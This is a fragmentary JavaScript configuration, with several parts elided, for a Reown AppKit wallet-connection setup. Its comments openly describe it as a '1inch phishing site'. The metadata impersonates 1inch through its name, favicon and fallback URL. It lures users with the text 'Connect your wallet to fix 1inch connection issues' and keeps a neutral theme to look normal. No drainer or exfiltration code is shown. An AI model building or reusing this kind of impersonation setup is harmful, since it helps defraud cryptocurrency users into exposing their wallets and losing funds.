/**
 * Reown AppKit Configuration for 1inch Phishing Site
 * 
...
// Metadata for the 1inch phishing site
const metadata = {
  name: '1inch Wallet Connection',
  description: 'Connect your wallet to fix 1inch connection issues',
  url: typeof window !== 'undefined' ? window.location.origin : 'https://1inch.io',
  icons: ['https://1inch.io/favicon.ico']
}
...
try {
  appKit = createAppKit({
    ...
    themeMode: 'light',
    themeVariables: {
      // Use neutral colors for normal appearance
...
// Reown Wallet Manager for 1inch phishing
...
// Supported wallets for the 1inch phishing site
